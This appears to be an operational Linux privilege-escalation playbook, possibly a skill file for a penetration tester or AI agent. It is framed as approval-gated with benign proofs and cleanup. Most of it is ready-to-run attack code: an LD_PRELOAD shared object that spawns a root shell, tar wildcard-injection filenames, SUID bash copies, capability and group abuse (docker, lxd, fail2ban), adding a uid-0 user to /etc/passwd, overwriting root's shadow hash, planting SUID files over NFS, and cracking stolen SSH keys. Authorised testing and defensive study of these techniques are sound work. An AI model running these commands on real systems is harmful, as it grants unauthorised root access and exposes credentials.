# Linux privilege-escalation playbook
# In-scope host, approval-gated, BENIGN proof (id=uid=0), ALWAYS clean up. Prefer the lowest-risk vector.
# Enumeration first — see refs/enumeration.md (linpeas.sh). This file turns a found vector into benign root.
# (Vectors enriched from the user's 0daysec linux-privilege-escalation + linux-playbook notes.)

## Vector picker (lowest-risk → highest-risk)
1. sudo NOPASSWD / GTFOBins  2. SUID GTFOBins  3. capabilities  4. readable creds / key reuse
5. writable cron/timer/service  6. PATH hijack  7. group (docker/lxd/disk/fail2ban)
8. writable /etc/passwd|shadow  9. NFS no_root_squash  10. kernel/pkexec/sudo CVE (HIGH RISK — last resort)

Always prove with `id` (uid=0) + one benign command, record every change in `cleanup.md`, and revert.

═══════════════════════════════════════════════════════════════════════════
## 1. sudo misconfig
═══════════════════════════════════════════════════════════════════════════
```
sudo -l                  # read it carefully: NOPASSWD entries, (ALL), and env_keep settings
```
- **NOPASSWD binary in GTFOBins** → straight to root: look the binary up, use its `sudo` section.
  e.g. `sudo less /etc/profile` → `!/bin/sh`; `sudo vim -c ':!/bin/sh'`; `sudo awk 'BEGIN{system("/bin/sh")}'`.
- **`sudo` + `env_keep+=LD_PRELOAD`** → load a shared object as root:
  ```c
  // preload.c  — benign: become root, prove id, drop a shell
  #include <stdlib.h>
  #include <unistd.h>
  void _init(){ unsetenv("LD_PRELOAD"); setresuid(0,0,0); setresgid(0,0,0); system("id; /bin/bash -p"); }
  ```
  ```
  gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
  sudo LD_PRELOAD=/tmp/preload.so <any-allowed-program>      # e.g. sudo LD_PRELOAD=/tmp/preload.so openssl
  ```
- **`sudo` + `env_keep+=LD_LIBRARY_PATH`** → hijack a library the allowed program loads:
  ```
  ldd /usr/sbin/apache2                 # find a lib it loads, e.g. libcrypt.so.1
  gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c   # library_path.c defines the loaded fn → root shell
  sudo LD_LIBRARY_PATH=/tmp apache2
  ```
- **sudo version CVE** → Baron Samedit (CVE-2021-3156), see Kernel/CVE section.

═══════════════════════════════════════════════════════════════════════════
## 2. SUID / SGID + GTFOBins automation
═══════════════════════════════════════════════════════════════════════════
```
find / -perm -4000 -type f 2>/dev/null
```
- SUID binary in GTFOBins → use its SUID section. SUID `bash` → `bash -p` (keep euid). `cp`/`find`/`nmap`/
  `vim`/`python` etc. each have a one-liner.
- **Automate the match** (installed binaries vs GTFOBins list):
  ```
  apt list --installed 2>/dev/null | tr '/' ' ' | cut -d' ' -f1,3 | sed 's/[0-9]://g' | tee installed_pkgs.list
  for i in $(curl -s https://gtfobins.github.io/gtfobins.json | jq -r 'keys[]'); do \
     grep -qx "$i" installed_pkgs.list && echo "GTFO candidate: $i"; done
  ```
- **Capability abuse** (`getcap -r /`): `cap_setuid+ep` on an interpreter →
  ```
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("id; /bin/bash -p")'
  # perl/node/ruby equivalents; vim/view with cap: :py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-pc","reset; exec sh")
  ```
- **Copy-root-bash primitive** (when you can run something as root that writes a file): `cp /bin/bash
  /tmp/rootbash && chmod +s /tmp/rootbash` then `/tmp/rootbash -p` (lab/benign proof; clean up the copy).

═══════════════════════════════════════════════════════════════════════════
## 3. Writable cron / timer / service
═══════════════════════════════════════════════════════════════════════════
```
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers --all
```
- **World-writable script run by root cron** → append a benign root-run marker, wait one interval,
  confirm, REVERT. (Benign: `id > /tmp/pe_proof_$(id -u).txt` as root, then remove.)
- **tar wildcard injection** (root cron does `tar ... *` in a writable dir):
  ```
  echo 'id > /tmp/pe_proof.txt' > shell.sh
  echo "" > '--checkpoint=1'; echo "" > '--checkpoint-action=exec=sh shell.sh'
  # when the cron tar runs, it treats the filenames as flags → runs shell.sh as root. Clean up all three.
  ```
- **logrotten** (writable log rotated by root logrotte): compile `logrotten`, point a payload at the log →
  root exec on rotation. HIGH-touch; prefer only in lab / with approval.
- **Writable `.service` / systemd unit** → set `ExecStart=` to a benign marker, `systemctl daemon-reload`
  + start (if permitted), confirm, REVERT.

═══════════════════════════════════════════════════════════════════════════
## 4. PATH hijack
═══════════════════════════════════════════════════════════════════════════
A root-owned SUID binary or cron script calls another binary by a **relative name** (`system("service ...")`).
```
export PATH=/tmp:$PATH
printf '#!/bin/sh\nid > /tmp/pe_proof.txt\n' > /tmp/<relative-name>; chmod +x /tmp/<relative-name>
# run the SUID/cron trigger → your binary runs as root. Confirm, then restore PATH + remove the file.
```

═══════════════════════════════════════════════════════════════════════════
## 5. Group memberships
═══════════════════════════════════════════════════════════════════════════
```
id    # look for: docker, lxd/lxc, disk, adm, shadow, sudo, fail2ban, …
```
- **docker** → mount host root in a container (benign id proof; don't modify host):
  ```
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh -c 'id; cat /etc/shadow | head -1'   # proof only
  # socket form: docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <img> chroot /mnt sh
  ```
- **lxd/lxc** → privileged container mounting host:
  ```
  lxc init <alias> privesc -c security.privileged=true
  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
  lxc start privesc; lxc exec privesc /bin/sh    # read /mnt/root (benign proof); clean up the container
  ```
- **disk** → `debugfs /dev/sdaX` READ-ONLY (read /etc/shadow as proof; never write).
- **fail2ban** (sudo fail2ban-client): `sudo fail2ban-client set <jail> action evil actionban "chmod +s
  /bin/bash"` + trigger a ban → `/bin/bash -p` (benign; revert the SUID bit).
- **adm** → read logs (`/var/log`) for creds. **shadow** → read `/etc/shadow` → offline crack (→ credential tooling).

═══════════════════════════════════════════════════════════════════════════
## 6. Writable /etc/passwd or /etc/shadow
═══════════════════════════════════════════════════════════════════════════
```
ls -la /etc/passwd /etc/shadow
# writable /etc/passwd → add a root-uid user with a known password:
openssl passwd 'Pentest123'                      # -> hash
#   append:  pe:<hash>:0:0:root:/root:/bin/bash   (uid 0) ; su pe  (benign proof) ; REMOVE the line
# writable /etc/shadow → replace root's hash:
mkpasswd -m sha-512 'Pentest123'                 # -> $6$... ; swap into root row ; su root ; RESTORE original
# both readable → crack:
unshadow passwd.txt shadow.txt > passwords.txt   # then hashcat/john offline
```
Always restore the original file content from a backup you take first. Record in `cleanup.md`.

═══════════════════════════════════════════════════════════════════════════
## 7. NFS no_root_squash
═══════════════════════════════════════════════════════════════════════════
```
cat /etc/exports                       # look for  no_root_squash  on an exported, writable share
showmount -e <TARGET_IP>
# from a box where you are root: mount, drop a SUID shell owned by root, run it on the target:
mount -o rw <TARGET_IP>:/share /mnt/x
cp /bin/bash /mnt/x/rootbash; chmod +s /mnt/x/rootbash      # on target: /share/rootbash -p  (benign id)
```
Lab/approved only; on prod, report feasibility rather than planting SUID. Clean up the planted file.

═══════════════════════════════════════════════════════════════════════════
## 8. Readable creds / key reuse
═══════════════════════════════════════════════════════════════════════════
Config files, `.bash_history`, `~/.ssh/id_rsa`, DB connection strings, backups (`*.bak/*.old/*.sql`),
`/proc/*/cmdline`. Reuse found creds/keys (`su <user>`, `ssh -i key`), escalate if they're root's. SSH key →
`ssh2john id_rsa > h; john --wordlist=rockyou.txt h` if passphrased (→ credential-access tooling).

═══════════════════════════════════════════════════════════════════════════
## 9. Kernel / pkexec / sudo CVEs — HIGH RISK, LAST RESORT
═══════════════════════════════════════════════════════════════════════════
Run `linux-exploit-suggester` (linpeas runs it inline). A kernel exploit can **crash prod** — on a live
host, REPORT FEASIBILITY and escalate only in an approved maintenance window. Named classics to recognise:
| CVE | Name | Hits |
|---|---|---|
| CVE-2021-4034 | **PwnKit** (pkexec) | almost every distro 2009–2022; very reliable local root |
| CVE-2021-3156 | **Baron Samedit** (sudo heap) | sudo < 1.9.5p2 |
| CVE-2022-0847 | **DirtyPipe** | kernel 5.8–5.16; overwrite read-only/SUID files |
| CVE-2016-5195 | **DirtyCow** | old kernels; write to read-only mappings |
| CVE-2021-22555 | Netfilter | kernel heap OOB |
Notes-sourced PoCs seen in the user's set: **CopyFail** (DirtyPipe-class, overwrites `/usr/bin/su` via
`splice()`), **Pack2Root** (CVE-2026-41651, PackageKit race → SUID bash). Treat all as feasibility-first.

═══════════════════════════════════════════════════════════════════════════
## Proof + cleanup  (every run)
═══════════════════════════════════════════════════════════════════════════
- Prove root: `id` (uid=0) + ONE benign command (e.g. `cat /etc/shadow | head -1`, `hostname`). No more.
- `cleanup.md` lists EVERYTHING created/changed: dropped tools (`/dev/shm/lp.sh`, `installed_pkgs.list`),
  SUID copies, `/etc/passwd`|`shadow` edits (with the restored original), cron/service edits, containers,
  proof files — and confirms each was reverted.
- NO persistence, NO backdoors, NO destruction, NO data exfil beyond the single proof line. In-scope host only.
